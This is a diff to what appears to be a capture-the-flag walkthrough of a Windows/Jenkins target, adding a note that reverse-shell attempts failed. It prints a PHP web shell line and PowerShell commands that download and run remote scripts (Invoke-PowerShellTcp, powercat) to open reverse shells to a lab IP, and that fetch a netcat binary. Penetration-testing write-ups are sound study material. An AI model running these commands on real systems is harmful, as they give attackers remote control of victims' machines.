@@ -135,6 +135,16 @@ echo '<?php SYSTEM($_REQUEST['cmd']); ?>' >> "C:\inetpub\wwwroot\cmd.php"
 
 all failed.
 
+Same goes for any type of reverse shell activity:
+
+```
+powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.214/Invoke-PowerShell.ps1')); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.214 -Port 443
+
+powershell.exe  "IEX ((New-Object Net.WebClient).DownloadString('http://10.10.14.214/powercat.ps1')); powercat.ps1 -c 10.10.14.214 -p 443 -ep;"
+
+powershell.exe -c iwr http://10.10.14.214/nc64.exe -outfile nc.exe
+```
+
 ### Foothold 
 
 We can view Jenkins files:
